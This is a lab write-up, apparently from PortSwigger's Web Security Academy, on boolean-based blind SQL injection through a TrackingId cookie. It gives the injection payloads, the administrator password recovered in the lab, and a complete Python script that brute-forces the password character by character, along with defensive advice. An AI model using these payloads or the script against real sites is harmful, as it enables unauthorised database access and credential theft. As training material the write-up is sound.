
## Lab: Blind SQL Injection with Conditional Responses
**Difficulty:** Practitioner ✅ Solved

**Technique:** Boolean-based blind SQLi via TrackingId cookie

**The Oracle:**
- TRUE condition → page shows "Welcome back" (Content-Length: 11535)
- FALSE condition → no "Welcome back" (Content-Length: 11474)
- Difference = 61 bytes = our entire signal

**Step-by-step payloads:**

Confirm vulnerability:
TrackingId=ABC' AND '1'='1   → Welcome back ✅
TrackingId=ABC' AND '1'='2   → No Welcome back ❌

Confirm users table:
' AND (SELECT 'x' FROM users LIMIT 1)='x

Confirm administrator exists:
' AND (SELECT 'x' FROM users WHERE username='administrator')='x

Find password length:
' AND (SELECT 'x' FROM users WHERE username='administrator' AND LENGTH(password)>19)='x  → ✅
' AND (SELECT 'x' FROM users WHERE username='administrator' AND LENGTH(password)>20)='x  → ❌
Password length = 20 characters

Extract each character:
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a

**Why I automated it:**
Burp Community Edition Intruder caused 504 timeouts due to rate limiting.
Built a custom Python script routing through Burp proxy (127.0.0.1:8080).
Script cracked all 20 characters successfully.

**Result:**
[*] Administrator password: jqq99hlmj2deoacrnjqj
Logged in as administrator → Lab Solved ✅

**What I learned:**
- Blind SQLi needs no visible output — just a behavioral difference
- Content-Length is a reliable oracle when "Welcome back" isn't rendering visually
- Python automation beats Burp Community Intruder for blind attacks
- Always route scripts through Burp proxy in lab environments

**Defense:**
- Parameterized queries eliminate blind SQLi entirely
- Never let application behavior differ based on SQL errors
- Rate limit cookie-based requests to prevent automated extraction'''
#HERE IS THE SCRIPT#

'''import urllib3
urllib3.disable_warnings()
import requests
import string

# ===== UPDATE THESE VALUES EACH TIME YOU OPEN A NEW LAB =====
url = "https://YOUR-LAB-ID.web-security-academy.net/"
tracking_id = "YOUR-TRACKING-ID"
session = "YOUR-SESSION-VALUE"
# ============================================================

charset = string.ascii_lowercase + string.digits
password = ""

print("[*] Starting Blind SQLi Brute Force...")
print("[*] Target: administrator password")
print("[*] Password length: 20 characters\n")

for position in range(1, 21):
    found = False
    for char in charset:
        payload = f"{tracking_id}' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{char}"
        
        cookies = {
            "TrackingId": payload,
            "session": session
        }
        
        response = requests.get(
            url,
            cookies=cookies,
            proxies={
                "http": "http://127.0.0.1:8080",
                "https": "http://127.0.0.1:8080"
            },
            verify=False
        )
        
        if "Welcome back" in response.text:
            password += char
            print(f"[+] Position {position}: '{char}' found! Password so far: {password}")
            found = True
            break
    
    if not found:
        print(f"[-] Position {position}: No match found!")

print(f"\n[*] Attack complete!")
print(f"[*] Administrator password: {password}")
'''
